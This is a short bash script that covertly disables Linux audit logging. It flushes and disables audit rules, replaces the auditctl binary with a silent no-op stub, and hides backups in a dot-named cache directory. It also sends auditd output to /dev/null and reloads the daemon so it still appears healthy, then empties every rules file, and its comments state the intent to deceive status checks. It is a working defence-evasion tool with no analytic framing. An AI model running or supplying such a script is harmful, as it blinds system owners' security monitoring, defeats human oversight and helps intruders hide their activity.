#!/usr/bin/env bash

AUDITCTL_LOC=$(which auditctl)
AUDITD_CONF="/etc/audit/auditd.conf"
BACKUP_DIR="/var/cache/.syspkg"

mkdir -p "$BACKUP_DIR"

# flush all existing rules with the real binary before we swap it out
"$AUDITCTL_LOC" -D 2>/dev/null
"$AUDITCTL_LOC" -e 0 2>/dev/null   # disable auditing kernel-side

# back up and shadow auditctl with a no-op wrapper
cp "$AUDITCTL_LOC" "${BACKUP_DIR}/auditctl.orig"
cat > "$AUDITCTL_LOC" <<'EOF'
#!/usr/bin/env bash
# auditctl stub — exits 0 silently for all invocations
exit 0
EOF
chmod 755 "$AUDITCTL_LOC"

# redirect auditd log output to /dev/null so the daemon keeps running
# but writes nothing — looks healthy in systemctl status
if [[ -f "$AUDITD_CONF" ]]; then
    cp "$AUDITD_CONF" "${BACKUP_DIR}/auditd.conf.orig"
    sed -i 's|^log_file\s*=.*|log_file = /dev/null|' "$AUDITD_CONF"
    sed -i 's|^write_logs\s*=.*|write_logs = no|'    "$AUDITD_CONF"
    # if write_logs line doesn't exist, add it
    grep -q "^write_logs" "$AUDITD_CONF" || echo "write_logs = no" >> "$AUDITD_CONF"
    # tell auditd to reload its config without restarting (stays "active (running)")
    pkill -HUP auditd 2>/dev/null
fi

# nuke any rules files so they don't reload on restart
if [[ -d /etc/audit/rules.d ]]; then
    cp -r /etc/audit/rules.d "${BACKUP_DIR}/rules.d.orig"
    find /etc/audit/rules.d -name "*.rules" -exec truncate -s 0 {} \;
fi
[[ -f /etc/audit/audit.rules ]] && truncate -s 0 /etc/audit/audit.rules
